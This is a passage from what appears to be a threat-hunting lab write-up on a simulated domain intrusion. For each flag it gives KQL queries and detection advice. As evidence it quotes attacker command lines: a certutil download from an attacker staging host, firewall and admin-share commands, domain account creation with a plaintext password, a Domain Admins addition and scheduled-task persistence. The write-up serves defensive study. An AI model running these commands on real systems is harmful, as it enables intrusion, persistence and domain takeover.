### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where CommandLine_s has_any ("net share", "New-SmbShare", "icacls", "grant:Everyone", "grant:everyone")
| project UtcTime_s, Computer, CommandLine_s
| order by todatetime(UtcTime_s) asc

### 🖼️ Screenshot
<img width="1764" height="818" alt="image" src="https://github.com/user-attachments/assets/c291c878-7a98-4a33-93cc-2c676e05e234" />

### 🛠️ Detection Recommendation
Monitor for creation or modification of network shares, especially those granting broad permissions (e.g., `everyone,full`). Alert on `net share` or `New-SmbShare` commands executed from user workstations and correlate with suspicious file activity in shared directories.

**Hunting Tip:**  
Search for share creation commands and pivot to the shared path. Investigate any executables placed in those directories and look for access from other hosts to identify lateral movement pathways.

</details>

---

<details>
<summary id="-flag-28">🚩 <strong>Flag 28: <Technique Name></strong></summary>

### 🎯 Objective
Enable inbound network access required for lateral movement by modifying firewall rules.

### 📌 Finding
A firewall rule named `SMB` was added using `netsh advfirewall` to allow inbound TCP traffic on port 445, enabling SMB communication.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 22:54:09.901 UTC |
| Process | cmd.exe |
| Parent Process | update.exe / attacker-controlled process |
| Command Line | cmd.exe /c "netsh advfirewall firewall add rule name=\"SMB\" dir=in action=allow protocol=tcp localport=445" |

### 💡 Why it matters
Opening port 445 allows SMB traffic, which is commonly used for lateral movement in Windows environments. By modifying firewall rules, the attacker ensures remote systems can connect to the compromised host, facilitating file sharing, tool transfer, and remote execution. This significantly increases the attacker's ability to spread across the network.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where CommandLine_s has_any ("netsh advfirewall firewall add rule", "New-NetFirewallRule")
| project UtcTime_s, Computer, CommandLine_s
| order by todatetime(UtcTime_s) asc

### 🖼️ Screenshot
<img width="2076" height="794" alt="image" src="https://github.com/user-attachments/assets/755ae84a-70fe-4d46-bc0d-70802bcaf964" />

### 🛠️ Detection Recommendation
Monitor for firewall rule changes using `netsh advfirewall` or PowerShell equivalents. Alert on rules that allow inbound access to sensitive ports (e.g., 445, 3389) and correlate with suspicious process activity or recent compromise indicators.

**Hunting Tip:**  
Search for command-line activity involving firewall modifications and pivot to newly opened ports. Investigate any correlation between firewall changes and subsequent inbound connections or lateral movement activity.

</details>

---

<details>
<summary id="-flag-29">🚩 <strong>Flag 29: <Technique Name></strong></summary>

### 🎯 Objective
Maintain SYSTEM-level execution and use a trusted service process to perform lateral movement actions while blending in with normal system activity.

### 📌 Finding
After privilege escalation, attacker activity (file copy, share creation, firewall modification) was executed under `spoolsv.exe`, indicating process migration into a trusted Windows service for stealth and persistence.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 22:14:55.324 UTC |
| Process | cmd.exe |
| Parent Process | spoolsv.exe |
| Command Line | cmd.exe /c copy C:\Users\Public\update.exe \\10.1.57.66\C$\Users\Public\update.exe |

### 💡 Why it matters
`spoolsv.exe` (Print Spooler service) runs as **NT AUTHORITY\SYSTEM** and is a trusted Windows process. By injecting or migrating into this process, the attacker:
- Gains **high privileges**
- Blends malicious activity with legitimate system behavior
- Reduces likelihood of detection by EDR tools

This is a strong indicator of **post-exploitation tradecraft**, where the attacker is maintaining control and preparing for lateral movement across the network.

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "1"
| where Computer contains "EC2AMAZ-B9GHHO6"
| where CommandLine_s has_any ("net share", "copy", "netsh", "firewall", "xcopy", "robocopy")
| project UtcTime_s, User_s, Image_s, CommandLine_s, ParentImage_s, ParentCommandLine_s
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="2286" height="880" alt="image" src="https://github.com/user-attachments/assets/7ceb02bb-bdfd-4a18-a7ca-79db0a06eac2" />

### 🛠️ Detection Recommendation
Monitor for:
- Non-print-related child processes spawned by `spoolsv.exe` (e.g., `cmd.exe`, `powershell.exe`)
- Network activity originating from `spoolsv.exe`
- Parent-child anomalies involving service processes

Implement behavioral detection rules for:
- SYSTEM processes spawning interactive shells
- Suspicious command execution from service accounts

**Hunting Tip:**  
Baseline normal behavior of critical Windows services (like `spoolsv.exe`). Any deviation—especially spawning command shells or performing file transfers—is a high-confidence signal of compromise.

</details>

---

<details>
<summary id="-flag-30">🚩 <strong>Flag 30: <Technique Name></strong></summary>

### 🎯 Objective
Transfer the attacker’s primary payload to a remote system to enable lateral movement and establish execution on another host.

### 📌 Finding
The attacker used Windows administrative shares (C$) to copy a malicious executable (`update.exe`) from the compromised workstation to a remote server, indicating active lateral movement.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 22:14:55.324 UTC |
| Process | cmd.exe |
| Parent Process | spoolsv.exe |
| Command Line | cmd.exe /c copy C:\Users\Public\update.exe \\10.1.57.66\C$\Users\Public\update.exe |

### 💡 Why it matters
Administrative shares (like C$) are built-in Windows features typically used by administrators. Attackers abuse them to:
- Move payloads across systems without dropping new tools
- Blend in with legitimate admin activity
- Expand their foothold across the network

This confirms **lateral movement is in progress** and that the attacker has sufficient privileges (likely SYSTEM or admin-level access) to access remote systems.

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "1"
| where Computer contains "EC2AMAZ-B9GHHO6"
| where CommandLine_s contains "C$" and CommandLine_s contains "copy"
| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s, ParentImage_s
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="2290" height="892" alt="image" src="https://github.com/user-attachments/assets/a09128d8-9fcd-49fd-b037-145a1f451457" />

### 🛠️ Detection Recommendation
Monitor for:
- Use of `copy`, `xcopy`, or `robocopy` targeting `\\*\C$` paths
- Remote file writes to admin shares
- Command execution involving UNC paths from non-admin endpoints
- SYSTEM-level processes performing network file transfers
Correlate with:
- Prior privilege escalation
- Network share creation
- Firewall rule modifications
  
**Hunting Tip:**  
Search for patterns involving `\\*\C$` combined with file copy operations. When paired with SYSTEM context and unusual parent processes (like `spoolsv.exe`), this is a high-confidence indicator of malicious lateral movement.

</details>

---

<details>
<summary id="-flag-31">🚩 <strong>Flag 31: <Technique Name></strong></summary>

### 🎯 Objective
Download additional tooling (AnyDesk) from attacker-controlled infrastructure to enable remote access and maintain control over the compromised server.

### 📌 Finding
A built-in Windows utility (`certutil.exe`) was abused to download a remote access tool from an external staging server, demonstrating Living Off the Land (LOLBins) technique to avoid detection.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 22:10:52.841 UTC |
| Process | certutil.exe |
| Parent Process | cmd.exe |
| Command Line | certutil -urlcache -split -f http://sync.cloud-endpoint.net:8080/AnyDesk.exe C:\Users\Public\AnyDesk.exe |

### 💡 Why it matters
`certutil.exe` is a trusted Windows utility, commonly abused by attackers to download payloads without introducing new tools. This technique:
- Evades traditional application allowlisting
- Blends in with legitimate system activity
- Enables delivery of remote access tools (like AnyDesk) for persistent control

This indicates **tool staging and persistence setup**, escalating the attacker’s ability to maintain access and operate remotely.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "EC2AMAZ-16V3AU4"  
| where CommandLine_s has_any ("http", "urlcache", "DownloadFile", "bitsadmin", "curl")
| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="2248" height="1062" alt="image" src="https://github.com/user-attachments/assets/0d776d8d-d4ff-4145-bc51-82128e0653ad" />

### 🛠️ Detection Recommendation
Monitor for:
- `certutil.exe` usage with `-urlcache`, `-split`, or external URLs
- Downloads to suspicious directories (e.g., `C:\Users\Public`)
- Command-line activity involving HTTP/HTTPS from system utilities

Correlate with:
- External network connections
- Execution of newly downloaded binaries
- Other LOLBin usage (PowerShell, bitsadmin, curl)

**Hunting Tip:**  
Search for command lines containing `certutil` + `http` or `https`. Pay special attention to downloads targeting public or writable directories and uncommon domains mimicking legitimate infrastructure.

</details>

---

<details>
<summary id="-flag-32">🚩 <strong>Flag 32: <Technique Name></strong></summary>

### 🎯 Objective
Execute commands remotely on the server by creating a temporary Windows service, enabling lateral movement and SYSTEM-level execution.

### 📌 Finding
The attacker created a suspicious Windows service with a randomized name (`MzLbIBFm`) to execute commands remotely. The service leveraged `cmd.exe` to download and stage tools from attacker-controlled infrastructure, indicating service-based remote execution.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 22:10:52 UTC (approx) |
| Process | services.exe |
| Parent Process | services.exe |
| Command Line | %COMSPEC% /Q /c echo certutil -urlcache -split -f http://sync.cloud-endpoint.net:8080/AnyDesk.exe ... |

### 💡 Why it matters
Creating services with random names is a common attacker technique to:
- Execute code remotely with **SYSTEM privileges**
- Avoid detection by blending into legitimate service activity
- Establish temporary or persistent execution mechanisms

This behavior is strongly associated with tools like:
- PsExec
- Impacket (e.g., smbexec, psexec.py)
- Custom service-based loaders

It indicates **confirmed lateral movement and remote execution**, with the attacker now operating on a new host.

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventData_Xml_s contains "ServiceName"
| where Computer contains "EC2AMAZ-16V3AU4"
| project UtcTime_s, Computer, EventData_Xml_s
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="2270" height="844" alt="image" src="https://github.com/user-attachments/assets/a0d41c1f-1875-41c0-a065-f44074d31b82" />

### 🛠️ Detection Recommendation
Monitor for:
- Event ID **7045** (Service Creation) with unusual or random service names
- Services executing `cmd.exe`, `powershell.exe`, or external downloads
- Service ImagePath values containing encoded or chained commands
- Short-lived services that are created and quickly removed

Correlate with:
- SMB connections (admin shares like C$)
- File transfers to the same host
- Prior credential access or privilege escalation activity

**Hunting Tip:**  
Search for Event ID 7045 where:
- Service names are random or non-standard
- ImagePath includes `cmd.exe /c` or download utilities (certutil, powershell, bitsadmin)

Randomized service names + command execution = **high-confidence remote execution indicator**.

</details>

---

<details>
<summary id="-flag-33">🚩 <strong>Flag 33: <Technique Name></strong></summary>

### 🎯 Objective
Verify execution context and privileges on the newly compromised host to confirm successful lateral movement and SYSTEM-level access.

### 📌 Finding
The attacker executed the `whoami` command via a remotely created service to determine the current user context, confirming they were running as `NT AUTHORITY\SYSTEM`.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 22:10:52 UTC (approx) |
| Process | cmd.exe |
| Parent Process | services.exe |
| Command Line | %COMSPEC% /Q /c echo whoami ^> \\%COMPUTERNAME%\C$\__output_... |

### 💡 Why it matters
`whoami` is almost always the **first command executed after lateral movement**. It allows the attacker to:
- Confirm privilege level (e.g., SYSTEM vs user)
- Validate successful remote execution
- Determine next steps (credential dumping, persistence, domain escalation)

Seeing this command in conjunction with service creation strongly confirms:
- **Successful compromise of a new host**
- **Execution under elevated privileges**

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventData_Xml_s contains "ServiceName"
| where Computer contains "EC2AMAZ-16V3AU4"
| project UtcTime_s, Computer, EventData_Xml_s
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="2274" height="846" alt="image" src="https://github.com/user-attachments/assets/9ca52820-7846-4b36-9c34-8785e453b5d7" />


### 🛠️ Detection Recommendation
Monitor for:
- Execution of `whoami` on remote hosts, especially via:
  - Service creation (Event ID 7045)
  - SMB-based execution (PsExec-like behavior)
- Output redirection to hidden or temp files (e.g., `\\ADMIN$`, `C$` shares)

Correlate with:
- Prior file transfers (e.g., `update.exe`)
- Service-based execution
- Admin share usage

**Hunting Tip:**  
Look for patterns like:
- `whoami` + output redirection (`>`, `\\*\C$`)
- Executed via `cmd.exe /c`  
This combination is a strong indicator of **remote command execution validation by an attacker**.

</details>

---

<details>
<summary id="-flag-34">🚩 <strong>Flag 34: <Technique Name></strong></summary>

### 🎯 Objective
The attacker was attempting **lateral movement into a remote system using NTLM authentication**, likely to gain access to another host using stolen or guessed credentials.

### 📌 Finding
Multiple **failed network logon attempts (Event ID 4625)** were observed originating from an internal host using the **NTLM authentication protocol**, indicating unsuccessful lateral movement attempts.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 |
| Process | N/A (authentication event) |
| Parent Process | N/A |
| Command Line | N/A |
| Source IP | 10.1.173.145 |
| Logon Type | 3 (Network Logon) |
| Authentication | NTLM |

### 💡 Why it matters
- **Repeated NTLM authentication failures** strongly indicate:
  - Credential guessing or brute-force attempts  
  - Pass-the-Hash activity using invalid or outdated hashes  
- NTLM is less secure than Kerberos and commonly abused in lateral movement.  
- These failed attempts often precede **successful compromise using alternate techniques** (e.g., SMB exec, service creation).  
- This activity signals an **active attacker probing access paths inside the network**, which is a critical early warning before full domain compromise.

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "4625"
| where Computer contains "EC2AMAZ-16V3AU4"
| project UtcTime_s, Computer, Caller_User_Name_s, src_ip_s, LogonType_s, Raw_s
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="2262" height="1038" alt="image" src="https://github.com/user-attachments/assets/4eb5e7b8-a647-4c51-a41c-97166f8afaa9" />

### 🛠️ Detection Recommendation
Detect repeated failed NTLM network logons (Event ID 4625, LogonType 3) from a single source host, especially when followed by a successful login—this may indicate brute force or pass-the-hash lateral movement.

**Hunting Tip:**  
- Monitor for **Event ID 4625 with LogonType = 3 and AuthenticationPackage = NTLM**  
- Correlate:
  - High volume of failures from a single source IP  
  - Follow-on **Event ID 4624 (successful logon)** from same source  
- Flag:
  - NTLM usage in environments expected to use Kerberos  
  - Repeated failures targeting multiple accounts or hosts  
- Enrich detection with:
  - SMB activity (Event ID 5140)  
  - Service creation (Event ID 7045)  
  - Remote execution patterns (PsExec/WMI)

</details>

---

<details>
<summary id="-flag-35">🚩 <strong>Flag 35: <Technique Name></strong></summary>

### 🎯 Objective
The attacker was attempting to **verify execution context on the Domain Controller and prepare for Active Directory database extraction** using Volume Shadow Copy techniques.

### 📌 Finding
The attacker first executed `whoami` to confirm privileges (likely SYSTEM), then leveraged **vssadmin.exe** to enumerate shadow copies as a precursor to extracting the NTDS.dit database.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-EEU3IA2.emberforge.local |
| Timestamp | 2026-01-30 23:19:21 – 23:34:56 |
| Process | C:\Windows\System32\cmd.exe |
| Parent Process | Likely services.exe (via remote execution) |
| Command Line | whoami → vssadmin list shadows /for=C: |

### 💡 Why it matters
- `whoami` confirms **privilege level (SYSTEM)** — critical before high-impact actions  
- `vssadmin.exe` is used to:
  - Access locked files like **NTDS.dit**
  - Bypass file locks using shadow copies  
- This sequence is a **strong indicator of Domain Controller compromise** and imminent credential dumping  
- Successful execution leads to:
  - Full domain credential exposure  
  - Golden Ticket / full domain takeover potential  

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "1"
| where Computer contains "EC2AMAZ-EEU3IA2"
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where Image_s !contains "splunk"
    and Image_s !contains "msedge"
    and Image_s !contains "EdgeUpdate"
    and Image_s !contains "identity_helper"
    and Image_s !contains "elevation_service"
    and Image_s !contains "MoUsoCoreWorker"
    and Image_s !contains "smartscreen"
| project UtcTime_s, User_s, Image_s, CommandLine_s
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="2262" height="1068" alt="image" src="https://github.com/user-attachments/assets/7814b571-ef72-42d2-a0f2-ef5204ed45fb" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
- Alert on:
  - `whoami` executed on Domain Controllers, especially via `cmd.exe /c`
  - `vssadmin list shadows` or `vssadmin create shadow`
- Correlate:
  - Execution under **NT AUTHORITY\SYSTEM**
  - Follow-on access to:
    - `C:\Windows\NTDS\ntds.dit`
    - SYSTEM hive files
- Flag:
  - Command chaining (`cmd.exe /c echo ...`)
  - Output redirection to temp files (`C:\Windows\Temp\_output`)
- Combine with:
  - Service creation (Event ID 7045)
  - Remote execution patterns (PsExec-like behavior)

</details>

---

<details>
<summary id="-flag-36">🚩 <strong>Flag 36: <Technique Name></strong></summary>

### 🎯 Objective
The attacker was attempting to **establish persistent access within the domain** by creating a stealthy service-like account that blends in with legitimate system/service accounts.

### 📌 Finding
<A new domain user account (`svc_backup`) was created using the `net user` command, indicating **persistence via account creation** after successful Domain Controller compromise.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-EEU3IA2.emberforge.local |
| Timestamp | 2026-01-30 23:38:11.786 |
| Process | C:\Windows\System32\cmd.exe |
| Parent Process | Likely services.exe (remote execution context) |
| Command Line | "C:\Windows\system32\cmd.EXE" /C net user svc_backup P@ssw0rd123! /add /domain |

### 💡 Why it matters
- Creating a domain account provides **long-term persistence**, even if initial access is lost  
- The naming convention (`svc_backup`) is designed to **blend in with legitimate service accounts**, reducing detection  
- This account can later be:
  - Added to privileged groups (e.g., Domain Admins)  
  - Used for lateral movement or remote access  
- Indicates the attacker has **high privileges (likely Domain Admin level)**  
- This is a strong signal of **full domain compromise**

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "1"
| where Computer contains "EC2AMAZ-EEU3IA2"
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where Image_s !contains "splunk"
    and Image_s !contains "msedge"
    and Image_s !contains "EdgeUpdate"
    and Image_s !contains "identity_helper"
    and Image_s !contains "elevation_service"
    and Image_s !contains "MoUsoCoreWorker"
    and Image_s !contains "smartscreen"
| project UtcTime_s, User_s, Image_s, CommandLine_s
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="2092" height="918" alt="image" src="https://github.com/user-attachments/assets/ffa75206-c6a2-4119-b7d8-4c8d15857a23" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
- Monitor for **Event ID 4720 (user account creation)** in Windows Security logs  
- Alert on:
  - Accounts with **service-like naming patterns** (e.g., `svc_*`, `backup_*`, `admin_*`)  
  - Account creation originating from:
    - Non-admin workstations  
    - SYSTEM context processes (cmd.exe, powershell.exe)  
- Correlate with:
  - Prior suspicious activity (credential dumping, lateral movement)  
  - Group membership changes (Event ID 4728, 4732)  
- Flag:
  - Accounts created outside normal provisioning workflows  
  - Accounts created during **off-hours or incident windows**  
- Enrich detection with:
  - User baseline behavior  
  - Privilege escalation events following account creation  

</details>

---

<details>
<summary id="-flag-37">🚩 <strong>Flag 37: <Technique Name></strong></summary>

### 🎯 Objective
The attacker was attempting to **establish persistent domain access by creating a new user account with known credentials**, enabling future re-entry and control of the environment.

### 📌 Finding
A domain account (`svc_backup`) was created using the `net user` command, with the **password exposed in plaintext within the command line**, indicating poor operational security and leaving sensitive credentials in logs.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-EEU3IA2.emberforge.local |
| Timestamp | 2026-01-30 23:38:11.786 |
| Process | C:\Windows\System32\cmd.exe |
| Parent Process | Likely services.exe (remote execution context) |
| Command Line | net user svc_backup P@ssw0rd123! /add /domain |

### 💡 Why it matters
- The attacker created a **persistent foothold** within Active Directory  
- The password was exposed in plaintext, meaning:
  - It is now **permanently logged and recoverable**  
  - Defenders can **pivot and identify reuse of the credential**  
- Service-like naming (`svc_backup`) helps the account **blend in and evade detection**  
- This indicates **full compromise of domain-level privileges**  
- If not remediated, the attacker can:
  - Re-enter the environment at any time  
  - Escalate privileges or maintain long-term control  

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "1"
| where Computer contains "EC2AMAZ-EEU3IA2"
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where Image_s !contains "splunk"
    and Image_s !contains "msedge"
    and Image_s !contains "EdgeUpdate"
    and Image_s !contains "identity_helper"
    and Image_s !contains "elevation_service"
    and Image_s !contains "MoUsoCoreWorker"
    and Image_s !contains "smartscreen"
| project UtcTime_s, User_s, Image_s, CommandLine_s
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="2034" height="950" alt="image" src="https://github.com/user-attachments/assets/617d1438-5102-4053-bdd7-228c4c480231" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
- Monitor for **Event ID 4720 (user account creation)**  
- Alert on:
  - `net user * /add /domain` executions  
  - Command lines containing **plaintext passwords**  
- Flag:
  - Accounts with naming patterns like `svc_*`, `backup_*`, `admin_*`  
  - Account creation from **SYSTEM context or non-admin endpoints**  
- Correlate with:
  - Prior suspicious activity (credential dumping, lateral movement)  
  - Group membership changes (Event ID 4728, 4732)  
- Immediately:
  - Disable newly created suspicious accounts  
  - Reset exposed credentials across the environment  
- Enable:
  - Command-line logging (Sysmon Event ID 1)  
  - Sensitive string detection in logs  

</details>

---

<details>
<summary id="-flag-38">🚩 <strong>Flag 38: <Technique Name></strong></summary>

### 🎯 Objective
The attacker was attempting to **escalate privileges to full domain control** by adding a newly created account to a highly privileged Active Directory group.

### 📌 Finding
The attacker executed a command to add the `svc_backup` account to the **Domain Admins** group, granting it **highest-level privileges across the domain**.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-EEU3IA2.emberforge.local |
| Timestamp | 2026-01-30 23:39:37.994 |
| Process | C:\Windows\System32\net1.exe |
| Parent Process | C:\Windows\System32\cmd.exe |
| Command Line | C:\Windows\system32\net1 group "Domain Admins" svc_backup /add /domain |

### 💡 Why it matters
- Adding a user to **Domain Admins** grants:
  - Full administrative control over all domain systems  
  - Access to sensitive data, credentials, and infrastructure  
- This represents **complete domain compromise**  
- The attacker now has:
  - Persistent privileged access  
  - Ability to create additional backdoors or accounts  
  - Capability to deploy malware or ransomware at scale  
- This action is often one of the **final steps in an attack chain**, indicating successful escalation

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "1"
| where Computer contains "EC2AMAZ-EEU3IA2"
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where Image_s !contains "splunk"
    and Image_s !contains "msedge"
    and Image_s !contains "EdgeUpdate"
    and Image_s !contains "identity_helper"
    and Image_s !contains "elevation_service"
    and Image_s !contains "MoUsoCoreWorker"
    and Image_s !contains "smartscreen"
| project UtcTime_s, User_s, Image_s, CommandLine_s
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="1478" height="952" alt="image" src="https://github.com/user-attachments/assets/0ebcd8b7-76f7-45b7-b146-4e51c578f188" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
- Monitor for **Event ID 4728 / 4732 (group membership changes)**  
- Alert on:
  - Any additions to **Domain Admins**, Enterprise Admins, or other privileged groups  
- Flag:
  - Accounts recently created and quickly added to privileged groups  
  - Changes initiated by:
    - SYSTEM context  
    - Non-administrative users  
- Correlate with:
  - Prior account creation (Event ID 4720)  
  - Credential dumping or lateral movement activity  
- Implement:
  - Real-time alerts for privileged group changes  
  - Just-In-Time (JIT) admin access controls  
  - Privileged access reviews and monitoring  

</details>

---

<details>
<summary id="-flag-39">🚩 <strong>Flag 39: <Technique Name></strong></summary>

### 🎯 Objective
Establish authenticated access to a remote system (Domain Controller) by mapping a network drive using valid credentials, enabling lateral movement and tool staging.

### 📌 Finding
The attacker executed a `net use` command from a SYSTEM-level process to map a network share (Z:) on the Domain Controller using plaintext administrative credentials embedded directly in the command line.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 23:45:25.132 |
| Process | C:\Windows\System32\net.exe |
| Parent Process | C:\Windows\System32\cmd.exe |
| Command Line | net use Z: \\10.1.173.145\tools /user:EMBERFORGE\Administrator EmberForge2024! |

### 💡 Why it matters
This is a critical OPSEC failure and high-risk behavior:
- Credentials are exposed in **plaintext**, making them easily recoverable from logs (SIEM, EDR, command-line auditing).
- The attacker is leveraging **valid domain admin credentials**, indicating full compromise of privileged access.
- Mapping a network drive enables **tool transfer, staging, and execution**, accelerating lateral movement and domain-wide impact.
- This demonstrates a shift from initial compromise → **full domain control and operational expansion**.

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "1"
| where Computer contains "EC2AMAZ-EEU3IA2"
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where Image_s !contains "splunk"
    and Image_s !contains "msedge"
    and Image_s !contains "EdgeUpdate"
    and Image_s !contains "identity_helper"
    and Image_s !contains "elevation_service"
    and Image_s !contains "MoUsoCoreWorker"
    and Image_s !contains "smartscreen"
| project UtcTime_s, User_s, Image_s, CommandLine_s
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="1850" height="1036" alt="image" src="https://github.com/user-attachments/assets/bd2759f8-1d4f-4c6a-b3cb-ff4fca3a3f3c" />

### 🛠️ Detection Recommendation
- Monitor for `net.exe` usage with `/user:` and password arguments in command-line logs.
- Alert on **plaintext credential exposure in process command lines**.
- Detect **network share mappings (Event ID 4624 Logon Type 3 + net use patterns)**.
- Correlate SYSTEM-level processes initiating outbound SMB connections.
- Implement **credential hygiene controls** (disable command-line credential usage, enforce secure alternatives like Kerberos).

**Hunting Tip:**  
`kql
EventCode=1 AND CommandLine contains "net use" AND CommandLine contains "/user:"

</details>

---

<details>
<summary id="-flag-40">🚩 <strong>Flag 40: <Technique Name></strong></summary>

### 🎯 Objective
Establish persistence on the compromised system to ensure the attacker's payload executes automatically after reboot and maintains long-term access.

### 📌 Finding
The attacker created a scheduled task named **"WindowsUpdate"** to execute a malicious payload (`update.exe`) from a public directory. The task was configured to run as SYSTEM at system startup, mimicking a legitimate Windows process to evade detection.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 23:47:38.302 |
| Process | C:\Windows\System32\schtasks.exe |
| Parent Process | C:\Windows\System32\cmd.exe |
| Command Line | schtasks /create /tn "WindowsUpdate" /tr "C:\Users\Public\update.exe" /sc onstart /ru system |

### 💡 Why it matters
- This establishes **persistent access**, allowing the attacker to regain execution after reboot.
- The task name **"WindowsUpdate"** is designed to blend in with legitimate system tasks, reducing the likelihood of detection.
- Running as **SYSTEM** gives the payload the highest level of privilege.
- This indicates the attacker has moved from **lateral movement → persistence**, solidifying control over the environment.

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "1"
| where Computer contains "EC2AMAZ-EEU3IA2"
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where Image_s !contains "splunk"
    and Image_s !contains "msedge"
    and Image_s !contains "EdgeUpdate"
    and Image_s !contains "identity_helper"
    and Image_s !contains "elevation_service"
    and Image_s !contains "MoUsoCoreWorker"
    and Image_s !contains "smartscreen"
| project UtcTime_s, User_s, Image_s, CommandLine_s
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="2296" height="1192" alt="image" src="https://github.com/user-attachments/assets/bfb0e668-6902-47d3-908f-ebb4dfb1838d" />

### 🛠️ Detection Recommendation
- Monitor for **scheduled task creation** (Event ID 4698, Sysmon Event ID 1/13).
- Alert on tasks created with:
  - Suspicious names mimicking Windows services (e.g., *WindowsUpdate*, *MicrosoftUpdate*)
  - Execution paths in **user-writable directories** (e.g., `C:\Users\Public\`)
- Track use of `schtasks.exe` with `/create` and `/ru system`.
- Implement allowlisting for scheduled task creation.

**Hunting Tip:**  
`kql
EventCode=1 AND Image endswith "schtasks.exe" AND CommandLine contains "/create"

</details>

---

<details>
<summary id="-flag-41">🚩 <strong>Flag 41: <Technique Name></strong></summary>

### 🎯 Objective
Establish persistent remote access using a legitimate remote management tool to maintain control without relying on malware.

### 📌 Finding
The attacker installed **AnyDesk**, a legitimate remote access software, by copying it from a staging location (`C:\Users\Public`) into `C:\ProgramData\AnyDesk\`. This enables stealthy, unattended access that blends in with normal administrative activity.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 23:09:38.930 |
| Process | C:\Users\Public\AnyDesk.exe |
| Parent Process | Unknown (likely cmd.exe or prior staged execution) |
| Command Line | File copy/install activity placing AnyDesk into ProgramData |

### 💡 Why it matters
- **Living-off-the-land technique**: Using legitimate software reduces detection compared to malware.
- Enables **persistent remote access** without needing exploits or backdoors.
- Installed in `ProgramData`, a common location for legitimate applications → **blends in**.
- Often used for **hands-on-keyboard access**, allowing attackers to operate interactively.
- Can bypass traditional AV since the binary is trusted and signed.

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "11"
| where Computer contains "EC2AMAZ-16V3AU4"
| where TargetFilename_s contains "AnyDesk"
| project UtcTime_s, Computer, Image_s, TargetFilename_s
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="1736" height="830" alt="image" src="https://github.com/user-attachments/assets/6a1e0fe9-d5ff-400e-94d9-e25d8b3fc8de" />

### 🛠️ Detection Recommendation
- **Living-off-the-land technique**: Using legitimate software reduces detection compared to malware.
- Enables **persistent remote access** without needing exploits or backdoors.
- Installed in `ProgramData`, a common location for legitimate applications → **blends in**.
- Often used for **hands-on-keyboard access**, allowing attackers to operate interactively.
- Can bypass traditional AV since the binary is trusted and signed.

